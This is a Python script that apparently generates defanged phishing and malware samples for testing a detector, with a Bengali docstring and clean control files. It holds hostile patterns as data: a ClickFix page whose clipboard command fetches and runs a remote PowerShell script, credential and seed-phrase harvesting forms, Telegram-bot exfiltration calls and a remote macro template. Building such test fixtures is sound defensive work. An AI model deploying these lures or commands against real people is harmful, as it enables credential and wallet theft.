#!/usr/bin/env python3
"""
ডেমো ও টেস্টের জন্য নিরাপদ নকল ফিশিং স্যাম্পল তৈরি করে।
সব ডোমেইন/বট/ঠিকানা কাল্পনিক; কোনো আসল ক্ষতিকর কোড নেই।

ব্যবহার:  python3 tests/make_samples.py examples/
"""
import email.message
import io
import os
import sys
import zipfile
import zlib


def _qr_png(text):
    try:
        import qrcode
    except ImportError:
        return None
    buf = io.BytesIO()
    qrcode.make(text).save(buf, "PNG")
    return buf.getvalue()


def phishing_email():
    html = (
        "<html><body><p>Dear customer, your bKash account will be suspended within 24 hours. "
        "Verify now and enter PIN.</p>"
        '<a href="http://bkash-verify-login.top/secure/account?user=test@mail.com">https://www.bkash.com/login</a>'
        "</body></html>"
    )
    attach = (
        "<html><head><title>Microsoft Office 365</title></head><body>"
        '<form action="https://evil-collector.example.ru/next.php" method="post">'
        "<input type=email name=email><input type=password name=pass></form>"
        '<script>var t=atob("aGVsbG8=");'
        'fetch("https://api.telegram.org/bot1234567890:AAHabcdefghijklmnopqrstuvwxyz0123456/sendMessage",{method:"POST"});'
        "document.addEventListener('contextmenu',e=>e.preventDefault());</script></body></html>"
    )
    m = email.message.EmailMessage()
    m["From"] = '"bKash Support" <support@bkash-help.top>'
    m["Reply-To"] = "scammer@gmail.com"
    m["To"] = "victim@example.com"
    m["Subject"] = "জরুরি: আপনার অ্যাকাউন্ট ব্লক হবে"
    m["Received"] = "from mail.bkash-help.top (unknown [45.133.1.20]) by mx.example.com with ESMTP"
    m["Authentication-Results"] = "mx.example.com; spf=fail smtp.mailfrom=bkash-help.top; dkim=none; dmarc=fail"
    m.set_content("plain version")
    m.add_alternative(html, subtype="html")
    qr = _qr_png("https://paypa1-secure-login.xyz/verify")
    if qr:
        m.add_attachment(qr, maintype="image", subtype="png", filename="qr.png")
    m.add_attachment(attach.encode(), maintype="text", subtype="html", filename="Invoice.pdf.html")
    return bytes(m)


def legit_email():
    m = email.message.EmailMessage()
    m["From"] = "Google <no-reply@accounts.google.com>"
    m["To"] = "user@example.com"
    m["Subject"] = "Security alert"
    m["Received"] = "from mail-sor-f69.google.com (mail-sor-f69.google.com [209.85.220.69]) by mx.example.com"
    m["Authentication-Results"] = "mx.example.com; spf=pass smtp.mailfrom=google.com; dkim=pass header.d=accounts.google.com; dmarc=pass"
    m.set_content("A new sign-in on Linux. You can check activity at https://myaccount.google.com/notifications")
    return bytes(m)


def phishing_pdf():
    s = zlib.compress(b"<< /Type /Action /S /JavaScript /JS (app.alert(1)) >> /URI (https://docusign-review.click/doc?id=1)")
    return (b"%PDF-1.4\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /Length "
            + str(len(s)).encode() + b" /Filter /FlateDecode >>\nstream\n" + s
            + b"\nendstream\nendobj\n3 0 obj << /Type /Page >> endobj\n%%EOF")


def clean_pdf():
    return b"%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\n2 0 obj << /Type /Page >> endobj\n%%EOF"


def phishing_apk():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        perms = " ".join("android.permission." + p for p in
                         ("RECEIVE_SMS", "READ_SMS", "BIND_ACCESSIBILITY_SERVICE", "SYSTEM_ALERT_WINDOW", "READ_CONTACTS"))
        z.writestr("AndroidManifest.xml", perms.encode("utf-16le"))
        z.writestr("classes.dex", b"dex\n035\x00 https://api.telegram.org/bot7777777777:AAFakeTokenFakeTokenFakeTokenFake12/sendMessage "
                                  b"http://panel.badserver.xyz/gate.php")
    return buf.getvalue()


def clickfix_html():
    return (b"<html><title>Verify you are human</title><body>I'm not a robot. Press Windows + R then Ctrl+V and Enter"
            b'<script>navigator.clipboard.writeText("powershell -w hidden -c iex(iwr http://x.top/a.ps1)")</script>'
            b"<script>var b=new Blob([atob('TVo=')]);var a=document.createElement('a');"
            b"a.href=URL.createObjectURL(b);a.download='doc.iso'</script></body></html>")


def macro_docx():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0 Attribute VB_Name AutoOpen")
        z.writestr("word/_rels/settings.xml.rels",
                   '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                   'Target="http://templates.bad-host.top/t.dotm" TargetMode="External"/></Relationships>')
    return buf.getvalue()


def malware_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("Invoice_2026.pdf.exe", b"MZ" + b"\x00" * 200)
        z.writestr("readme.txt", b"open the invoice")
    return buf.getvalue()


def svg_phish():
    return (b'<svg xmlns="http://www.w3.org/2000/svg" onload="location=\'https://m1crosoft-login.top/?e=a@b.com\'">'
            b"<script>window.location='https://m1crosoft-login.top'</script></svg>")


def crypto_html():
    return (b"<html><title>Claim Airdrop</title><body>Connect wallet. Enter your 12 word recovery phrase"
            b"<textarea name=seed></textarea><script>ethereum.request({method:'eth_requestAccounts'});"
            b"setApprovalForAll('0x1111111111111111111111111111111111111111',true)</script></body></html>")


def legit_html():
    return (b"<html><head><title>My Recipes</title></head><body><h1>Pancakes</h1>"
            b"<p>Mix flour and eggs.</p><a href='https://en.wikipedia.org/wiki/Pancake'>Wikipedia</a></body></html>")


def plain_png():
    try:
        from PIL import Image
    except ImportError:
        return None
    buf = io.BytesIO()
    Image.new("RGB", (60, 40), (200, 50, 50)).save(buf, "PNG")
    return buf.getvalue()


SAMPLES = {
    "phish_email.eml": phishing_email,
    "legit_email.eml": legit_email,
    "phish_doc.pdf": phishing_pdf,
    "clean.pdf": clean_pdf,
    "bkash_update.apk": phishing_apk,
    "captcha.html": clickfix_html,
    "macro_invoice.docx": macro_docx,
    "invoice.zip": malware_zip,
    "voicemail.svg": svg_phish,
    "airdrop.html": crypto_html,
    "recipe.html": legit_html,
    "photo.png": plain_png,
}


def write_all(outdir):
    os.makedirs(outdir, exist_ok=True)
    made = {}
    for name, fn in SAMPLES.items():
        data = fn()
        if data is None:
            continue
        path = os.path.join(outdir, name)
        with open(path, "wb") as f:
            f.write(data)
        made[name] = path
    return made


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "examples"
    for _n, p in write_all(out).items():
        print("created", p)
